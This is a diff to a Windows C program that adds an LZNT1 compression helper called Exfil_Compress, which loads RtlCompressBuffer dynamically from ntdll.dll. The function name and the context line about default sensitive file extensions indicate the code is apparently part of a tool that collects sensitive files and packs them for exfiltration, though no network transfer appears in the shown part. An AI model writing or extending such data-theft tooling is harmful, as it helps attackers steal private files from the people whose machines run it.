@@ -16,6 +16,82 @@
 
 #pragma comment(lib, "shlwapi.lib")
 
+/* compression via ntdll */
+typedef NTSTATUS (WINAPI *RtlCompressBufferPtr)(
+    USHORT CompressionFormat,
+    PUCHAR UncompressedBuffer,
+    ULONG UncompressedBufferSize,
+    PUCHAR CompressedBuffer,
+    ULONG CompressedBufferSize,
+    ULONG UncompressedChunkSize,
+    PULONG FinalCompressedSize,
+    PVOID WorkSpace
+);
+
+typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSizePtr)(
+    USHORT CompressionFormat,
+    PULONG CompressBufferWorkSpaceSize,
+    PULONG CompressFragmentWorkSpaceSize
+);
+
+#define COMPRESSION_FORMAT_LZNT1 0x0002
+#define COMPRESSION_ENGINE_STANDARD 0x0000
+
+// compresse data avec LZNT1, retourne nouveau buffer (caller doit free)
+static BOOL Exfil_Compress(BYTE* input, DWORD input_len, BYTE** output, DWORD* output_len) {
+    if (!input || !output || !output_len || input_len == 0) return FALSE;
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return FALSE;
+    
+    RtlCompressBufferPtr RtlCompressBuffer = 
+        (RtlCompressBufferPtr)GetProcAddress(ntdll, "RtlCompressBuffer");
+    RtlGetCompressionWorkSpaceSizePtr RtlGetCompressionWorkSpaceSize = 
+        (RtlGetCompressionWorkSpaceSizePtr)GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
+    
+    if (!RtlCompressBuffer || !RtlGetCompressionWorkSpaceSize) return FALSE;
+    
+    ULONG workspace_size = 0, fragment_size = 0;
+    if (RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
+                                       &workspace_size, &fragment_size) != 0) {
+        return FALSE;
+    }
+    
+    void* workspace = malloc(workspace_size);
+    if (!workspace) return FALSE;
+    
+    // buffer output = taille input (worst case)
+    BYTE* compressed = (BYTE*)malloc(input_len);
+    if (!compressed) {
+        free(workspace);
+        return FALSE;
+    }
+    
+    ULONG final_size = 0;
+    NTSTATUS status = RtlCompressBuffer(
+        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
+        input, input_len,
+        compressed, input_len,
+        4096,
+        &final_size,
+        workspace
+    );
+    
+    free(workspace);
+    
+    if (status != 0 || final_size == 0) {
+        free(compressed);
+        return FALSE;
+    }
+    
+    // shrink buffer
+    BYTE* shrunk = (BYTE*)realloc(compressed, final_size);
+    *output = shrunk ? shrunk : compressed;
+    *output_len = final_size;
+    
+    return TRUE;
+}
+
 /* Configuration */
 
 // Extensions sensibles par défaut
